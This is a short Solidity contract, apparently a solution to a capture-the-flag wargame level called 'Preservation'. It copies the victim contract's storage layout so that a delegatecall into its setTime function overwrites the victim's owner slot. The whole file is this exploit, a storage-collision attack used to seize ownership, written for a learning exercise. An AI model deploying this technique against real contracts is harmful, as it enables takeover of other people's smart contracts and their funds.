// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationSolution {
  address slot0; // lib1
  address slot1; // lib2
  uint256 slot2; // owner

  // This is exacly same signature of victim contract function
  function setTime(uint256 _t) public {
    // we assume this gonna change slot2 var but if callee contract call this
    // function via delegatecall actually we change callee slot2 storage
    slot2 = _t;
  }
}
